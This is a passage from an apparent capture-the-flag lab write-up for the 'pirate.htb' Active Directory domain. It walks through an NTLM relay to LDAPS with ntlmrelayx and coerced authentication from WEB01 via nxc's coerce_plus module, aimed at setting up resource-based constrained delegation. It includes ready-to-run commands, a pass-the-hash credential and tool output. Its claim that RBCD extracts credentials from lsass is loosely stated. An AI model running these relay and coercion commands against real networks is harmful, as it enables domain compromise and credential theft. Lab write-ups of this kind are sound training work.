The next step is to obtain credentials for a.white. I'm learning a technique that, given certain prerequisites, allows extracting credentials from the lsass process. The technique in question is RBCD (Resource Based Constrained Delegation). Here is how it works in practice:

  1. A machine account must be created inside the compromised machine.
  2. This machine account is inserted into the msDS-AllowedToActOnBehalfOfOtherIdentity attribute (the attribute used to determine whether a requestor can perform an operation on behalf of another - delegation).
  3. The delegation is used to request a Kerberos TGT ticket for authentication.

The first step is to obtain the LDAP shell. To do so, we use a relay attack on the domain controller combined with a coercion on the target WEB01 to force an authentication request.

This is possible because SMB signing is not required towards this target:

k0d14k@kpb:~/Documenti/pirate/foothold/realy-dump$ nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\gMSA_ADFS_prod$:accd0fdfe82ff8c84cd710244c7302e8

I set ntlmrelayx to listen and perform the coercion using the coerce_plus module of nxc.

sudo $(which ntlmrelayx.py) -t ldaps://pirate.htb -i -smb2support --remove-mic --delegate-access
nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8 -M coerce_plus -o L=10.10.15.169

Once the attack is launched, the ntlmrelayx output will show a line indicating the localhost address and a port to connect to the LDAP shell.
